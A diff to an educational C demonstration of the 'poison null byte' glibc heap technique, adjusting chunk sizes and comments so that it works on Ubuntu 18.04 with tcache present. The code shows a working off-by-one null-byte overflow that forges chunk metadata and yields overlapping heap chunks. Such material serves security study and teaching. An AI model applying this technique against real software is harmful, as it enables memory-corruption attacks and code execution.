@@ -9,8 +9,7 @@
 int main()
 {
 	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
-	fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
-	fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
+	fprintf(stderr, "Tested in Ubuntu 18.04 64bit.\n");
 	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
 	uint8_t* a;
@@ -21,21 +20,21 @@ int main()
 	uint8_t* d;
 	void *barrier;
 
-	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
-	a = (uint8_t*) malloc(0x100);
+	fprintf(stderr, "We allocate 0x500 bytes for 'a'.\n");
+	a = (uint8_t*) malloc(0x500);
 	fprintf(stderr, "a: %p\n", a);
 	int real_a_size = malloc_usable_size(a);
 	fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
-		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);
+		"(it may be more than 0x500 because of rounding): %#x\n", real_a_size);
 
 	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
 	 * the least significant byte of this will be 0x10, because the size of the chunk includes
 	 * the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0x200);
+	b = (uint8_t*) malloc(0xa00);
 
 	fprintf(stderr, "b: %p\n", b);
 
-	c = (uint8_t*) malloc(0x100);
+	c = (uint8_t*) malloc(0x500);
 	fprintf(stderr, "c: %p\n", c);
 
 	barrier =  malloc(0x100);
@@ -47,18 +46,18 @@ int main()
 	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
 	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
 	// this added check requires we are allowed to have null pointers in b (not just a c string)
-	//*(size_t*)(b+0x1f0) = 0x200;
+	//*(size_t*)(b+0x9f0) = 0xa00;
 	fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
 		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
-	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
+	// we set this location to 0xa00 since 0xa00 == (0xa11 & 0xff00)
 	// which is the value of b.size after its first byte has been overwritten with a NULL byte
-	*(size_t*)(b+0x1f0) = 0x200;
+	*(size_t*)(b+0x9f0) = 0xa00;
 
 	// this technique works by overwriting the size metadata of a free chunk
 	free(b);
 	
 	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
-	fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
+	fprintf(stderr, "b.size is: (0xa00 + 0x10) | prev_in_use\n");
 	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
 	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
 	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
@@ -70,12 +69,12 @@ int main()
 	// The added check (commit id: 17f487b), if not properly handled as we did before,
 	// will detect the heap corruption now.
 	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
-	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
-	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
-	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
+	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)
+	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
+	// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00
 	fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
 		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
-	b1 = malloc(0x100);
+	b1 = malloc(0x500);
 
 	fprintf(stderr, "b1: %p\n",b1);
 	fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
@@ -85,10 +84,10 @@ int main()
 	fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n");
 	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
 
-	b2 = malloc(0x80);
+	b2 = malloc(0x480);
 	fprintf(stderr, "b2: %p\n",b2);
 
-	memset(b2,'B',0x80);
+	memset(b2,'B',0x480);
 	fprintf(stderr, "Current b2 content:\n%s\n",b2);
 
 	fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
@@ -97,11 +96,11 @@ int main()
 	free(c);
 	
 	fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
-	d = malloc(0x300);
+	d = malloc(0xc00);
 	fprintf(stderr, "d: %p\n",d);
 	
 	fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
-	memset(d,'D',0x300);
+	memset(d,'D',0xc00);
 
 	fprintf(stderr, "New b2 content:\n%s\n",b2);
 
